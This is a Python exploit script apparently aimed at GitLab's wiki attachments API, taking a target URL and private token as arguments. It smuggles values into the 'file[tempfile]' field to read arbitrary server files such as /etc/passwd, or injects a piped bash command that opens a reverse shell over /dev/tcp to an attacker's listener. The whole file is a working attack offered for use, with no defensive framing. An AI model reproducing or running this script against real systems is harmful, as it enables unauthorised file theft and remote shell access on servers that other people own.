#!/usr/bin/env python3
# -*- coding: utf-8 -*
# author:snowming
import os
import re
import json
import requests
from optparse import OptionParser
import urllib


# Parse command line args:
usage = '\npython3 exp.py -p <project_url> -t "<private_token>" -l <listener_ip> -p <listener_port>\n'\
        'python3 exp.py -p <project_url> -t "<private_token>" -f "/etc/passwd"                          # not single \' but double \"'

parser = OptionParser(usage=usage)
parser.add_option("-u", '--URL', dest='url', action="store",
                  help="Target project URL")
parser.add_option("-l", '--LHOST', dest='lhost', action="store",
                  help="Host listening for reverse shell connection")
parser.add_option("-p", '--LPORT', dest='lport', action="store",
                  help="Port on which nc is listening")
parser.add_option("-f", '--file', dest='file', action="store",
          help="The file you want to see, no reverse shell for you.")
parser.add_option("-t", '--token',dest='token', action="store",
          help="private_token")
(options, args) = parser.parse_args()

URL = options.url
# check if specify scheme for Project URL
if('http' not in URL):
    print('You should specify URL Scheme! e.g. HTTP')
    exit(0)

URL = URL.rstrip('/')

substr = '/'
#get the target domain or ip, SAMPLE OUTPUT: http://47.56.208.67
TARGET = URL[0:URL.find(substr,URL.find(substr)+3)].rstrip('/')


LHOST = options.lhost
LPORT = options.lport
FILE = options.file
TOKEN = options.token

if TOKEN == None or URL == None:
        print("Target project URL and Private token is required!")
        exit(0)
if LHOST == None and LPORT == None and FILE ==None:
        print(parser.usage)
        exit(0)

if FILE:
    tempfile = FILE
    # make request, using POST METHOD!
    url = '{0}/api/v4/projects/1/wikis/attachments'.format(TARGET)
    body = {
        'file[filename]': '123',
        'file[tempfile]': '{0}'.format(tempfile)
    }
    headers = {'private-token': '{0}'.format(TOKEN)}
    response = requests.post(url, data=body, headers = headers)

    # to see if token privileges is enough high
    if("error_description" in response.json()):
        print("Fail! The reason is:")
        print(response.json()["error_description"])
        exit(0)
    file_path = response.json()["file_path"]

    if file_path:
        print("\nSend Payload Success :) \n\nPath: %s" % file_path)

    # make second request using upload path data.
    file_url = '{0}/wikis/{1}'.format(URL,file_path)
    # WATCH OUT: It is not POST METHOD but GET METHOD!
    response = requests.get(file_url, headers = headers)
    print("\nContent: \n%s" % (response.text))
else:
    tempfile = '| bash -c "bash -i >& /dev/tcp/{0}/{1} 0>&1"'.format(LHOST, LPORT)
    tempfile = urllib.parse.quote(tempfile)

    url = '{0}/api/v4/projects/1/wikis/attachments'.format(TARGET)
    body = "file[filename]=123&file[tempfile]=%s" % tempfile

    headers = {'private-token': '{0}'.format(TOKEN)}
    print("\nStarting Reverse Shell :)")
    requests.post(url, data=body, headers = headers)
